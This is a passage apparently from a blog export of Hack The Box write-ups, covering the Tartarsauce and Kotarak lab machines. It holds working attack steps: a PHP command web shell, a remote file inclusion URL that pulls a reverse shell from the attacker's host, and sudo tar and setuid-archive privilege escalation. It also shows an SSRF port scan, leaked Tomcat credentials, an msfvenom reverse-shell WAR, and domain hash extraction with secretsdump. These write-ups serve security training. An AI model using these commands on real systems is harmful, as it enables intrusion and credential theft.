((Ubuntu)) | http-robots.txt: 5 disallowed entries | /webservices/tar/tar/source/ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ |_/webservices/developmental/ /webservices/phpmyadmin/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Landing Page Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.17 seconds nmap shows there is a robots.txt file which I was able to confirm from a web browser: Only monstra directory gave me a result. Doing some research on the web, I found that Monstra is a lightweight cms. I explored the page source and all the links. The \"logged in\" hyperlink shows a login page: Before trying anything I always like to try simple things so I tried to login with the most standard credentials admin/admin, and believe it or not I am in! All seemed too easy to be honest. In fact, I spent a huge amount on what eventually turned out to be a rabbit hole. Using searchsploit I found exploit 43348 which was suitable for my scenario: Proof of Concept Steps to Reproduce: 1. Login with a valid credentials of an Editor 2. Select Files option from the Drop-down menu of Content 3. Upload a file with PHP (uppercase)extension containing the below code: (EDB Note: You can also use .php7) <?php $ cmd = $_GET [ 'cmd' ] ; system($cmd); ?> 4. Click on Upload 5. Once the file is uploaded Click on the uploaded file and add ?cmd= to the URL followed by a system command such as whoami,time,date etc. However, I was unable to upload or modify anything in the portal so I think that we just have read permissions although we have logged in with the admin user. I think this is just a trick from the author of the box. After being stuck there for a while I went back to enumerate and I decided to scan the webservices directory I found earlier with gobuster. root@SittingDucks:~# gobuster dir -u http://10.10.10.88/webservices -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.88/webservices [+] Threads: 20 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/02/11 05:36:09 Starting gobuster =============================================================== /wp (Status: 301) I got an immediate hit on the wp directory which could indicate we are dealing with a wordpress site. This was confirmed when I browsed to that page. Although the site seems broken for some reasons we can still see that is powered by wordpress. The first thing I do when I find wordpress is involved is to use wpscan to enumerate the site. Worpress is very popular to have a huge amount of plugins which may present potential vulnerabilities that we can exploit. I lunched the command with the -e ap (enumerate all plugins) option. root@SittingDucks:~# wpscan -e ap --url http://10.10.10.88/webservices/wp _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.7.8 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.10.88/webservices/wp/ [+] Started: Tue Feb 11 05:52:01 2020 Interesting Finding(s): [+] http://10.10.10.88/webservices/wp/ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] http://10.10.10.88/webservices/wp/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] http://10.10.10.88/webservices/wp/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] http://10.10.10.88/webservices/wp/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06). | Found By: Emoji Settings (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.9.4' | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4' [i] The main theme could not be detected. [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up [+] Finished: Tue Feb 11 05:52:03 2020 [+] Requests Done: 23 [+] Cached Requests: 4 [+] Data Sent: 6.095 KB [+] Data Received: 37.379 KB [+] Memory used: 144.039 MB [+] Elapsed time: 00:00:01 Nothing really valuable in the output and no plugins were found which is very unusual. From the output I also notices the plugins enumerations happened via Passive Methods . Looking at the wpscan instructions I found out that there are two other methods: mixed and aggressive. So I decide to give it a try with aggressive mode adding this option to the command: --plugins-detection aggressive . This time I got some results: [+] Enumerating All Plugins (via Aggressive Methods) Checking Known Locations - Time: 00:05:51 <==========================================================================================================> (84849 / 84849) 100.00% Time: 00:05:51 [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] akismet | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/ | Last Updated: 2019-11-13T20:46:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 4.1.3 | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200 | | Version: 4.0.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt [+] brute-force-login-protection | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/ | Latest Version: 1.5.3 (up to date) | Last Updated: 2017-06-29T10:39:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/, status: 403 | | Version: 1.5.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt [+] gwolle-gb | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/ | Last Updated: 2020-02-01T14:42:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | [!] The version is out of date, the latest version is 3.1.9 | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200 | | Version: 2.3.10 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up [+] Finished: Tue Feb 11 06:04:15 2020 [+] Requests Done: 84864 [+] Cached Requests: 31 [+] Data Sent: 22.509 MB [+] Data Received: 11.414 MB [+] Memory used: 296.926 MB [+] Elapsed time: 00:06:01 Searchsploit gave me few results but not related to the versions of the plugins I found. I started looking online for some other exploits but no luck. This is where I got stuck for a while but I was sure this was the right path as I read something on a htb forum where people talked about vulnerable wp plugins on tartarsauce. Thus I went back and started looking at the readme files of the plugins and after a while I found this on the gwolle readme: == Changelog == = 2.3.10 = * 2018-2-12 * Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D This reminded me a good old lesson that for these kind of activities every small detail is vital! Searchsploit found an RFI exploit (38861) for this version of gwolle . This is an extract of the exploit: HTTP GET parameter \"abspath\" is not being properly sanitized before being used in PHP require () function . A remote attacker can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server . In order to do so the attacker needs to place a malicious 'wp-load.php' file into his server document root and includes server 's URL into request: http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website] In order to exploit this vulnerability ' allow_url_include ' shall be set to 1. Otherwise , attacker may still include local files and also execute arbitrary code . Successful exploitation of this vulnerability will lead to entire WordPress installation compromise , and may even lead to the entire web server compromise . With this in mind, I copied a php webshell from my kali box (/usr/share/laudanum/php/php-reverse-shell.php), I modified the content and updated the IP address (my kali box IP) and a port (I used 443) and renamed it as wp-load.php . I also started a simple HTTP webserver with python in the directory where wp-load.php is located. I then modified the URL to be exactly like this: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/wp-load.php) At this stage I activate a netcat listener on port 443 and I launched the URL. I got no shell back as expected. Looking at the python web server I see this: root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce# python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... 10.10.10.88 - - [11/Feb/2020 06:51:20] code 404, message File not found 10.10.10.88 - - [11/Feb/2020 06:51:20] \"GET /wp-load.phpwp-load.php HTTP/1.0\" 404 - The file is not found because wp-load.php is appended to the URL so I remove that bit and launched this URL instead http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:8000/ This time it worked! I got a simple shell and I used the procedure found in this cheatsheet to upgrade to a full interacive pty shell. As shown below I got in as the www-data user. www-data@TartarSauce:/$ cd /home www-data@TartarSauce:/home$ ls -l total 4 drwxrw---- 5 onuma onuma 4096 Feb 21 2018 onuma www-data@TartarSauce:/home$ cd onuma bash: cd: onuma: Permission denied Moving to the home directory I see another user ( onuma ) but I am unable to get to his home directory to get the flag because I don't have permissions. I need to find a way to escalate privileges to onuma . At this stage I decided to run an enumeration script named Linux-Smart-Enumeration (lse) which is similar to the popular LinEnum but unlike it, it tries to gradualy expose the information depending on its importance from a privesc point of view. I downloaded the script in the box first (specifically on /dev/shm since I can write there). Analyzing the output I noticed this potentially useful information: [!] sud010 Can we list sudo commands without a password?................... yes! --- Matching Defaults entries for www-data on TartarSauce: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on TartarSauce: (onuma) NOPASSWD: /bin/tar the user www-data can run the tar command as onuma without password. Let's see what can we do about it. GTFOBins is a great resource to find out about these things, in fact the site contains a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. This is what we can see for tar combined with sudo : We know that in our case we'll need to run this with as onuma so the command will be the following: sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh To understand more about the above command, let's break it down: The -c option creates a new archive; The -f /dev/null option uses the /dev/null black hole; The extra /dev/null is the location we're saving the archive to; The --checkpoint=1 option tells tar to display progress messages every X records. The --checkpoint-action=exec=/bin/sh options tells tar to run /bin/sh at each checkpoint, essentially giving us a shell. When I ran the command I get the expected result: www-data@TartarSauce:/$ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint = 1 --checkpoint-action = exec = /bin/sh tar: Removing leading `/' from member names $ whoami onuma Now, I have again a limited shell so again I use the procedure found in this cheatsheet to upgrade to a full interacive pty shell. Running the lse script again and scrutinizing it I noticed the following entry under the systemd timers section: NEXT LEFT LAST PASSED UNIT ACTIVATES Wed 2020-02-12 00:57:29 EST 2min 5s left Wed 2020-02-12 00:52:29 EST 2min 54s ago backuperer.timer backuperer.service backuperer does not sound as a standard service and the LEFT and PASSED columns indicate that the service may be running every 5 minutes. systemd timers are basically a way of doing cronjob on systemd services. Looking for backuperer I found a bash script in /usr/sbin : onuma@TartarSauce:/dev/shm$ ls -l /usr/sbin/backuperer -rwxr-xr-x 1 root root 1701 Feb 21 2018 /usr/sbin/backuperer this is the content of the script: #!/bin/bash #------------------------------------------------------------------------------------- # backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ # ONUMA Dev auto backup program # This tool will keep our webapp backed up incase another skiddie defaces us again. # We will be able to quickly restore from a backup in seconds ;P #------------------------------------------------------------------------------------- # Set Vars Here basedir = /var/www/html bkpdir = /var/backups tmpdir = /var/tmp testmsg = $bkpdir /onuma_backup_test.txt errormsg = $bkpdir /onuma_backup_error.txt tmpfile = $tmpdir /. $( /usr/bin/head -c100 /dev/urandom | sha1sum | cut -d ' ' -f1 ) check = $tmpdir /check # formatting printbdr () { for n in $( seq 72 ) ; do /usr/bin/printf $\"-\" ; done } bdr = $( printbdr ) # Added a test file to let us see when the last backup was run /usr/bin/printf $ \" $bdr \\nAuto backup backuperer backup last ran at : $( /bin/date ) \\n $bdr \\n\" > $testmsg # Cleanup from last time. /bin/rm -rf $tmpdir /.* $check # Backup onuma website dev files. /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir & # Added delay to wait for backup to complete if large files get added. /bin/sleep 30 # Test the backup integrity integrity_chk () { /usr/bin/diff -r $basedir $check$basedir } /bin/mkdir $check /bin/tar -zxvf $tmpfile -C $check if [[ $( integrity_chk ) ]] then # Report errors so the dev can investigate the issue. /usr/bin/printf $ \" $bdr \\nIntegrity Check Error in backup last ran : $( /bin/date ) \\n $bdr \\n $tmpfile \\n\" >> $errormsg integrity_chk >> $errormsg exit 2 else # Clean up and save archive to the bkpdir. /bin/mv $tmpfile $bkpdir /onuma-www-dev.bak /bin/rm -rf $check .* exit 0 fi To sum up, the script performs the following steps: Cleans up the last extracted directory with /bin/rm -rf $tmpdir/.* $check Backs up the $basedir directory to /var/tmp/$SHA1-RANDOM-FILENAME$ with /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir Sleeps for 30 seconds to allow the backup to complete. Runs the integrity_check function, comparing the current /var/www/html with the previously checked /var/tmp/check/var/www/html . If the directories are different, then it prints an error message to the log, and does not remove the /var/tmp/check directory. If the directories match, it moves the current tar package to /var/backups/onuma-www-dev.bak , and delete the /var/tmp/check directory . Even though I understand what the script does, I didn't know how to leverage it to privesc to root since I had no persmissions to edit it. I ended up looking this up and I found this article which clarified all my concerns I made me understand the mechanism and why I missed it. So according to that article we can take advantage of the 30 seconds sleep and the fact that tar will extract items while maintaining root permissions. Getting a root shell: The first step consists on creating a suid.c file containing the following code: int main ( void ){ setresuid ( 0 , 0 , 0 ); system ( \"/bin/bash\" ); } then I compile the suid.c root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce# gcc -m32 -o suid suid.c suid.c: In function ‘main': suid.c:2:3: warning: implicit declaration of function ‘setresuid' [-Wimplicit-function-declaration] 2 | setresuid(0, 0, 0); | &#94;~~~~~~~~ suid.c:3:3: warning: implicit declaration of function ‘system' [-Wimplicit-function-declaration] 3 | system(\"/bin/bash\"); | &#94;~~~~~ and I verify that the suid file is created: root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce# ll total 36 -rwxrwxr-x 1 root root 15532 Feb 12 17:37 suid -rwxrwxr-x 1 root root 63 Feb 12 17:28 suid.c I also add the suid to the previously generated suid file as follow: root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce# chmod 6555 suid root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce# ll total 36 -r-sr-sr-x 1 root root 15532 Feb 12 17:37 suid -rwxrwxr-x 1 root root 63 Feb 12 17:28 suid.c Next we create the archive with the /var/www/html directory struture as explained in the article: root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce# mkdir -p var/www/html root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce# cp suid var/www/html/ root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce# chmod 6555 var/www/html/suid root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce# tar zcvf suid.tar.gz var --owner = root --group = root var/ var/www/ var/www/html/ var/www/html/suid Now I create a simple python webserver on my kali box and I download the suid.tar.gz to tartarsauce. onuma@TartarSauce:/var/tmp$ systemctl list-timers WARNING: terminal is not fully functional NEXT LEFT LAST PASSED UNIT ACTIVATES Wed 2020-02-12 12:58:11 EST 667ms left Wed 2020-02-12 12:53:11 EST 4min 59s ago backuperer.timer backuperer.service Wed 2020-02-12 16:25:07 EST 3h 26min left Tue 2020-02-11 21:29:44 EST 15h ago apt-daily.timer apt-daily.service Wed 2020-02-12 23:56:05 EST 10h left Tue 2020-02-11 23:56:05 EST 13h ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service Thu 2020-02-13 06:46:01 EST 17h left Wed 2020-02-12 06:03:07 EST 6h ago apt-daily-upgrade.timer apt-daily-upgrade.service I monitor the timers with the above command and when I see the 5 minutes are approaching I check the directory to see the file with the random sha1 name created: onuma@TartarSauce:/var/tmp$ ll total 11280 drwxrwxrwt 8 root root 4096 Feb 12 12:58 ./ drwxr-xr-x 14 root root 4096 Feb 9 2018 ../ -rw-r--r-- 1 onuma onuma 11511681 Feb 12 12:58 .82e3d10b54248c5366b81b2bb93d54549b08e92e -rw-r--r-- 1 onuma onuma 2771 Feb 12 12:47 suid.tar.gz then I replace that file with the suid.tar.gz onuma@TartarSauce:/var/tmp$ cp suid.tar.gz .82e3d10b54248c5366b81b2bb93d54549b08e92e and then I wait 30 seconds and I move to the check directory and check that the suid file has been created: onuma@TartarSauce:/var/tmp$ cd check/var/www/html/ onuma@TartarSauce:/var/tmp/check/var/www/html$ ll total 24 drwxrwxr-x 2 root root 4096 Feb 12 12:44 ./ drwxrwxr-x 3 root root 4096 Feb 12 12:44 ../ -r-sr-sr-x 1 root root 15532 Feb 12 12:44 suid* then I execute it and can verify that I am root: onuma@TartarSauce:/var/tmp/check/var/www/html$ ./suid root@TartarSauce:/var/tmp/check/var/www/html# id uid=0(root) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)","tags":"blogging","loc":"https://sittingducks.io/Tartarsauce.html","title":"Tartarsauce"},{"url":"https://sittingducks.io/Kotarak.html","text":"Initial nmap root@SittingDucks:~# nmap -p- -sV 10 .10.10.55 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-22 17:23 GMT Nmap scan report for 10.10.10.55 Host is up (0.014s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8080/tcp open http Apache Tomcat 8.5.5 60000/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 66.83 seconds Let's try to browse to both tomcat and httpd ports: I also run a directories scan with gobuster on port 8080: root@SittingDucks:~# gobuster dir -u http://kotarak.htb:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 5 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://kotarak.htb:8080 [+] Threads: 5 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/01/23 05:22:32 Starting gobuster =============================================================== /docs (Status: 302) /examples (Status: 302) /manager (Status: 302) =============================================================== 2020/01/23 05:32:47 Finished =============================================================== and I do the same on port 60000: root@SittingDucks:~# gobuster dir -u http://kotarak.htb:60000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 5 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://kotarak.htb:60000 [+] Threads: 5 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/01/23 05:34:51 Starting gobuster =============================================================== /server-status (Status: 403) =============================================================== 2020/01/23 05:45:17 Finished =============================================================== I explored the directories gobuster and found the following admin panel login page: Having access to that portal would be giving us access to tomcat management interface which in turn can lead to other potential accesses. As shown above navigating to the box on port 60000 in the directory server-status found by gobuster shows a permission error. This page usually provide very useful information that we could use for our attack. For the Private Browser to do its job there must be some kind of mechanisms in the back-end, potentially another server or application that \"makes things private\". In fact, I suspect that when we enter the URL in the Private Browser this is then passed to the relevant back-end API endpoint to be processed and in turn the endpoint will respond with the private data. The mechanism I explained above is ideal for an SSRF (Server Side Request Forgery) which is very well explained here . With this nice explanation in mind I will try to add the Browser and see what happens. As we can see we now get access to the server-status page we previosly got permissions issues for. This is because now apache which is running on port 60000 receives the request as if it comes from the same host (in fact, we used localhost) The server-status page shows a list of running processes with listening ports. We can see port 888 is recurring. Browising to localhost on port 888 from the Private Browser we have this: I checked inside all the directories and they are all empty. I decide to have a look at this with curl which reveals the follwing output: root@SittingDucks:~# curl http://kotarak.htb:60000/url.php?path = localhost:888/?doc = backup <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!-- Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements. See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. --> <tomcat-users xmlns=\"http://tomcat.apache.org/xml\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://tomcat.apache.org/xml tomcat-users.xsd\" version=\"1.0\"> <!-- NOTE: By default, no user is included in the \"manager-gui\" role required to operate the \"/manager/html\" web application. If you wish to use this app, you must define such a user - the username and password are arbitrary. It is strongly recommended that you do NOT use one of the users in the commented out section below since they are intended for use with the examples web application. --> <!-- NOTE: The sample user and role entries below are intended for use with the examples web application. They are wrapped in a comment and thus are ignored when reading this file. If you wish to configure these users for use with the examples web application, do not forget to remove the <!.. ..> that surrounds them. You will also need to set the passwords to something appropriate. --> <!-- <role rolename=\"tomcat\"/> <role rolename=\"role1\"/> <user username=\"tomcat\" password=\"<must-be-changed>\" roles=\"tomcat\"/> <user username=\"both\" password=\"<must-be-changed>\" roles=\"tomcat,role1\"/> <user username=\"role1\" password=\"<must-be-changed>\" roles=\"role1\"/> --> <user username=\"admin\" password=\"3@g01PdhB!\" roles=\"manager,manager-gui,admin-gui,manager-script\"/> </tomcat-users> In the last line we can see a username and password. Let's see if we can use these credentials to login in the tomcat management panel. And we are in! The bottom part of the page shows a section we can use to upload a war file to the server. We can leverage this and upload some code in a war file which can give us a shell back. Before to do that I wanted to point out that this time we were lucky because we were able to see the server-status page which reveaed port 888 and by digging we also find the credentials. What if the page wasn't accessible? In this case there is another thing we could do. The same way we tested port 888 by inserting the string \"localhost:888\" in the Private Browser search field (or using curl), we can test the other ports: root@SittingDucks:~# curl http://kotarak.htb:60000/url.php?path = localhost:22 SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2 Protocol mismatch. The above is a test on port 22 which reveales the port is open. Technically we can write a little script that tries all the ports automatically. However there is already a tool in kali that can do these kind of things, wfuzz . root@SittingDucks:~# wfuzz -c -z range,1-65535 --hl = 2 http://kotarak.htb:60000/url.php?path = localhost:FUZZ Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ******************************************************** * Wfuzz 2.4 - The Web Fuzzer * ******************************************************** Target: http://kotarak.htb:60000/url.php?path=localhost:FUZZ Total requests: 65535 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000000022: 200 4 L 4 W 62 Ch \"22\" 000000090: 200 11 L 18 W 156 Ch \"90\" 000000110: 200 17 L 24 W 187 Ch \"110\" 000000200: 200 3 L 2 W 22 Ch \"200\" 000000320: 200 26 L 109 W 1232 Ch \"320\" 000000888: 200 78 L 265 W 3955 Ch \"888\" 000060000: 200 78 L 130 W 1171 Ch \"60000\" 000065535: 200 2 L 0 W 2 Ch \"65535\" As shown above wfuzz revealed other ports opened which we can probably use later. For now let's go back to uploading a war file and get a shell. To generate a shell embedded in a war file we can use msfvenom: root@SittingDucks:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST = 10 .10.14.4 LPORT = 1234 -f war > shell.war Payload size: 1089 bytes Final size of war file: 1089 bytes root@SittingDucks:~# ll total 4 -rw-rw-r-- 1 root root 1089 Jan 24 06:42 shell.war Once the war file is ready we upload it from the web page and we can see it in the list of applications: Now i set a netcat listener on port 1234 on my kali box and then I click on shell application in the tomcat manager panel (the shell link in the green screenshot above in the left). Once I click to that link I am redirected to this address \"http://kotarak.htb:8080/shell/\" in the browser and I am able to see this on my kali box: root@SittingDucks:~# nc -lvnp 1234 listening on [any] 1234 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.55] 34780 whoami tomcat python -c 'import pty;pty.spawn(\"/bin/bash\")' tomcat@kotarak-dmz:/$ I ran the above python command to upgrade to an interactive bash shell. We still d*o not have tab-autocomplete, history, etc. so we can do the following to get a complete working shell (from the pty shell): hit CTRL+Z to put the shell in the background: tomcat@kotarak-dmz:/$ &#94;Z [1]+ Stopped nc -lvnp 1234 run echo $TERM and stty -a to know the terminal type and the size of the current TTY respectively (rows 54; columns 190;) root@SittingDucks:~# echo $ TERM screen-256color and root@SittingDucks:~# stty -a speed 38400 baud; rows 54; columns 190; line = 0; intr = &#94;C; quit = &#94;\\; erase = &#94;?; kill = &#94;U; eof = &#94;D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = &#94;Q; stop = &#94;S; susp = &#94;Z; rprnt = &#94;R; werase = &#94;W; lnext = &#94;V; discard = &#94;O;min = 1; time = 0;-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc With the shell still in the background, now set the current STTY to type raw and tell it to echo the input characters with the following command: root@SittingDucks:~# stty raw -echo Now foreground the shell with the fg command: root@SittingDucks:~# nc -lvnp 1234 reset reset: unknown terminal type unknown Terminal type? screen-256color We will have the netcat listener back. Digit reset to reinitialize the terminal and when we are asked for the terminal type we add the output of the echo $TERM command we ran before. After the reset the shell should look normal again. The last step is to set the stty size to match our current kali window (from the info gathered on point 2) tomcat@kotarak-dmz:/$ stty rows 54 columns 190 Now that we have a full interactive shell let's go ahead with getting the user.txt flag. tomcat@kotarak-dmz:/$ locate user.txt locate user.txt /home/atanas/user.txt /usr/share/doc/fontconfig/fontconfig-user.txt.gz tomcat@kotarak-dmz:/$ cat /home/atanas/user.txt cat /home/atanas/user.txt cat: /home/atanas/user.txt: Permission denied The user.txt is owned by the user atanas and the user tomcat has no permission to read it so we need to find a way to privesc to atanas. Before running tools like LinEnum I have a quick look around and found this: tomcat@kotarak-dmz:/home$ ls -l total 8 drwxr-xr-x 4 atanas atanas 4096 Aug 29 2017 atanas drwxr-xr-x 3 tomcat tomcat 4096 Jul 21 2017 tomcat tomcat@kotarak-dmz:/home$ cd tomcat/ tomcat@kotarak-dmz:/home/tomcat$ ls -l total 4 drwxr-xr-x 3 tomcat tomcat 4096 Jul 21 2017 to_archive tomcat@kotarak-dmz:/home/tomcat$ cd to_archive/ tomcat@kotarak-dmz:/home/tomcat/to_archive$ ls -l total 4 drwxr-xr-x 2 tomcat tomcat 4096 Jul 21 2017 pentest_data S tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ ls -l total 28304 -rw-r--r-- 1 tomcat tomcat 16793600 Jul 21 2017 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -rw-r--r-- 1 tomcat tomcat 12189696 Jul 21 2017 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ file * 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit: data 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin: MS Windows registry file, NT/2000 or above The .dit extension indicates a Directory Information Tree (DIT) file used by Active Directory, which saves a hierarchy of network objects and access permissions; The .bin is a SYSTEM registry hive file. There is a utility called impacket-secretsdump we can use to extract hashes from these files, but first we need to download the files to our kali box: I setup a python web server listener on the victim machine and I download both the .dit and .bin files with wget on my box. One I have downloaded the file I can use to extract the hashes as follow: root@SittingDucks:/home/user/Documents/htb/boxes/kotarak# impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 